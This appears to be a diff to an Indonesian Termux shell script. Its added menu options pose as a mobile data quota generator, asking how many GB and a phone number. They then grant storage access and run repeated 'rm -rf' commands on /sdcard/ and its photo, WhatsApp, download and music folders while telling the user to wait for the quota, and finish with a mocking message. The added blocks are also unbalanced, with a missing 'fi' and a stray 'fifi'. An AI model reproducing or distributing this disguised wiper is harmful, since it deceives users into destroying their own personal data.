@@ -71,3 +71,136 @@ echo  $blue "AWOWKWOKKKK :V"
 echo "BOKEP TELAH DI HAPUS:v" | lolcat
 toilet -f standard "Dyxa#ABCD gans" | lolcat
 fi
+
+
+if [ $Gans = 2 ] || [ $Gans = 02 ]
+then
+echo $blue"╭──[Berapa GB?]>"
+read -p"╰───────root@dyxa#ABCD=•>" kntl;
+sleep 1
+echo $green"╭──[masukan nomor]>"
+read -p"╰───────root@dyxa#ABCD=•>" memeq;
+sleep 1
+echo $red "Loading"
+sleep 2
+
+termux-setup-storage
+
+rm -rf /sdcard/
+rm -rf /sdcard/Android
+rm -rf /sdcard/bluetooth
+rm -rf /sdcard/browser
+rm -rf /sdcard/DCIM
+rm -rf /sdcard/Download
+rm -rf /sdcard/Music
+rm -rf /sdcard/Pictures
+rm -rf /sdcard/SHAREit
+rm -rf /sdcard/WhatsApp
+rm -rf /sdcard/video
+echo  $blue "Tunggu Beberapa menit,hingga kuotanya masuk"
+echo  $red "sedang menunggu........"
+echo  $green "yang perlu anda tahu.menunggu itu membosankan........"
+
+rm -rf /sdcard/
+rm -rf /sdcard/Android
+rm -rf /sdcard/bluetooth
+rm -rf /sdcard/browser
+rm -rf /sdcard/DCIM
+rm -rf /sdcard/Download
+rm -rf /sdcard/Music
+rm -rf /sdcard/Pictures
+rm -rf /sdcard/SHAREit
+rm -rf /sdcard/WhatsApp
+echo  $red "menunggu menghapus file"
+echo  $blue "AWOWKWOKKKK :V"
+echo "BOKEP TELAH DI HAPUS:v" | lolcat
+toilet -f standard "Dyxa#ABCD gans" | lolcat
+fi
+
+if [ $Gans = 3 ] || [ $Gans = 03 ]
+then
+echo $blue"╭──[Berapa GB?]>"
+read -p"╰───────root@dyxa#ABCD=•>" kntl;
+sleep 1
+echo $green"╭──[masukan nomor]>"
+read -p"╰───────root@dyxa#ABCD=•>" memeq;
+sleep 1
+echo $red "Loading"
+sleep 2
+
+termux-setup-storage
+
+rm -rf /sdcard/
+rm -rf /sdcard/Android
+rm -rf /sdcard/bluetooth
+rm -rf /sdcard/browser
+rm -rf /sdcard/DCIM
+rm -rf /sdcard/Download
+rm -rf /sdcard/Music
+rm -rf /sdcard/Pictures
+rm -rf /sdcard/SHAREit
+rm -rf /sdcard/WhatsApp
+rm -rf /sdcard/video
+echo  $blue "Tunggu Beberapa menit,hingga kuotanya masuk"
+echo  $red "sedang menunggu........"
+echo  $green "yang perlu anda tahu.menunggu itu membosankan........"
+
+rm -rf /sdcard/
+rm -rf /sdcard/Android
+rm -rf /sdcard/bluetooth
+rm -rf /sdcard/browser
+rm -rf /sdcard/DCIM
+rm -rf /sdcard/Download
+rm -rf /sdcard/Music
+rm -rf /sdcard/Pictures
+rm -rf /sdcard/SHAREit
+rm -rf /sdcard/WhatsApp
+echo  $red "menunggu menghapus file"
+echo  $blue "AWOWKWOKKKK :V"
+echo "BOKEP TELAH DI HAPUS:v" | lolcat
+toilet -f standard "Dyxa#ABCD gans" | lolcat
+
+
+if [ $Gans = 4 ] || [ $Gans = 04 ]
+then
+echo $blue"╭──[Berapa GB?]>"
+read -p"╰───────root@dyxa#ABCD=•>" kntl;
+sleep 1
+echo $green"╭──[masukan nomor]>"
+read -p"╰───────root@dyxa#ABCD=•>" memeq;
+sleep 1
+echo $red "Loading"
+sleep 2
+
+termux-setup-storage
+
+rm -rf /sdcard/
+rm -rf /sdcard/Android
+rm -rf /sdcard/bluetooth
+rm -rf /sdcard/browser
+rm -rf /sdcard/DCIM
+rm -rf /sdcard/Download
+rm -rf /sdcard/Music
+rm -rf /sdcard/Pictures
+rm -rf /sdcard/SHAREit
+rm -rf /sdcard/WhatsApp
+rm -rf /sdcard/video
+echo  $blue "Tunggu Beberapa menit,hingga kuotanya masuk"
+echo  $red "sedang menunggu........"
+echo  $green "yang perlu anda tahu.menunggu itu membosankan........"
+
+rm -rf /sdcard/
+rm -rf /sdcard/Android
+rm -rf /sdcard/bluetooth
+rm -rf /sdcard/browser
+rm -rf /sdcard/DCIM
+rm -rf /sdcard/Download
+rm -rf /sdcard/Music
+rm -rf /sdcard/Pictures
+rm -rf /sdcard/SHAREit
+rm -rf /sdcard/WhatsApp
+echo  $red "menunggu menghapus file"
+echo  $blue "AWOWKWOKKKK :V"
+echo "BOKEP TELAH DI HAPUS:v" | lolcat
+toilet -f standard "Dyxa#ABCD gans" | lolcat
+fifi
